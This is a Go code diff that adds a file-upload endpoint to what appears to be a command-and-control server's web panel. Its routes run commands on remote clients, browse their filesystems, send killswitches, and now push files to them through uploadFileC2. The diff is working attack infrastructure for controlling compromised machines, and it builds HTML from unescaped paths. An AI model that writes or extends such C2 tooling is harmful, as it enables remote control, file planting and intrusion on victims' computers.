@@ -38,6 +38,7 @@ func WebServer() {
 	r.GET("/command/:clientid", getCommands)
 	r.GET("/fs/:clientid", getFilesystem)
 	r.POST("/ls/:clientid", listFiles)
+	r.POST("/upload/:clientid", uploadFile)
 	r.POST("/command/:clientid", execCMD)
 	r.POST("/kill/:clientid", sendKillswitch)
 	r.GET("/dump", dumpClients)
@@ -48,6 +49,44 @@ func WebServer() {
 
 	// Start
 	r.Run(":" + WebPort)
+}
+
+func uploadFile(c *gin.Context) {
+	id := c.Param("clientid")
+	idInt, err := strconv.Atoi(id)
+	if err != nil {
+		c.String(http.StatusInternalServerError, "Error happened, please make this a proper error later")
+		return
+	}
+
+	client, _, err := returnClient(idInt)
+	if err != nil {
+		return
+	}
+
+	if client.IsOnline == false {
+		c.String(http.StatusOK, "Client is currently offline!")
+		return
+	}
+
+	path, _ := c.GetPostForm("cmd")
+	file, err := c.FormFile("fileToUpload")
+	if err != nil {
+		log.Println(err)
+	}
+
+	resp, err := uploadFileC2(*client, *file, path)
+	if err != nil {
+		e := fmt.Sprintf("Error happened executing command: %v\n", err)
+		c.String(http.StatusOK, e)
+		return
+	}
+	if resp.Successful != true {
+		e := fmt.Sprintf("Error happened executing command: %v\n", resp.Message)
+		c.String(http.StatusOK, e)
+		return
+	}
+	listFiles(c)
 }
 
 func listFiles(c *gin.Context) {
@@ -69,14 +108,22 @@ func listFiles(c *gin.Context) {
 	}
 
 	path, _ := c.GetPostForm("cmd")
-
-	resp, err := requestFiles(*client, path)
-	if err != nil {
-		e := fmt.Sprintf("Error happened executing command: %v\n", err)
-		c.String(http.StatusOK, e)
-		return
-	}
 	var list string
+
+	uploadSection := fmt.Sprintf(`<form hx-post="/upload/%v" hx-encoding='multipart/form-data' id="uploader" hx-vals='{ "cmd": "%v" }' hx-target="#files">
+        <input type="file" name="fileToUpload" value="Upload file?" required>
+        <button id="but">
+          Upload
+        </button>
+  			<progress id="progress" value="0" max="100">Upload progress:</progress>
+      </form>
+      <script>
+        htmx.on('#form', 'htmx:xhr:progress', function (evt) {
+          htmx.find('#progress').setattribute('value', evt.detail.loaded / evt.detail.total * 100)
+        });
+      </script>`, client.ClientID, path)
+	list += uploadSection
+
 	currentLocation := fmt.Sprintf("Current location: %v<br>", path)
 	list += currentLocation
 
@@ -90,9 +137,23 @@ func listFiles(c *gin.Context) {
 		client.ClientID, parentFolder)
 	list += parentFolderLink
 
+	resp, err := requestFiles(*client, path)
+	if err != nil {
+		e := fmt.Sprintf("Error happened executing command: %v\n", err)
+		list += e
+		c.String(http.StatusOK, list)
+		return
+	}
+	if resp.Successful != true {
+		e := fmt.Sprintf("Error happened executing command: %v\n", resp.Message)
+		list += e
+		c.String(http.StatusOK, list)
+		return
+	}
+
 	for _, v := range resp.FileList.File {
 		if v.IsFolder == true {
-			entry := fmt.Sprintf("<a hx-post=\"/ls/%v\" hx-target=\"#files\" hx-vals='{\"cmd\": \"%v\"}' id=\"pointer\">[DIR] %v</a><br>",
+			entry := fmt.Sprintf("<a hx-post=\"/ls/%v\" hx-target=\"#files\" hx-vals='{\"cmd\": \"%v\"}' id=\"pointer\">[d] %v/</a><br>",
 				client.ClientID, v.FullPath, v.Name)
 			list += entry
 		} else {
